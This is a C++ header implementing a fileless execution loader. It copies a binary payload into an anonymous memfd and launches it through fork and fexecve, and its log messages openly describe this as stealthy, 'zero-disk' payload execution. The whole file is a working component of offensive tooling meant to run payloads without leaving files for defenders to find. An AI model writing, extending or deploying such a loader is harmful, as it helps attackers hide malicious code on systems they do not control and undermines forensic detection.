#pragma once
#include <vector>
#include <cstdint>
#include <string>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <iostream>

class EphemeralExec {
public:
    static bool execute(const std::vector<uint8_t>& binary, const std::vector<std::string>& args) {
        std::cout << "[Stealth] Creating anonymous memfd for zero-disk execution...\n";
        
        // Create an anonymous file in memory
        int fd = memfd_create("tsh_payload", MFD_CLOEXEC);
        if (fd < 0) {
            perror("memfd_create");
            return false;
        }

        // Write the binary to memory
        if (write(fd, binary.data(), binary.size()) != static_cast<ssize_t>(binary.size())) {
            perror("write");
            close(fd);
            return false;
        }

        std::cout << "[Stealth] Memory-only payload ready. Injecting process...\n";

        pid_t pid = fork();
        if (pid == 0) {
            // Child process
            std::vector<char*> c_args;
            c_args.push_back(const_cast<char*>("tsh_payload"));
            for (const auto& arg : args) {
                c_args.push_back(const_cast<char*>(arg.c_str()));
            }
            c_args.push_back(nullptr);

            char* envp[] = { nullptr };
            
            // Execute from the file descriptor (no disk path!)
            fexecve(fd, c_args.data(), envp);
            
            // If fexecve fails
            perror("fexecve");
            exit(1);
        } else if (pid > 0) {
            // Parent
            close(fd);
            return true;
        } else {
            perror("fork");
            close(fd);
            return false;
        }
    }
};
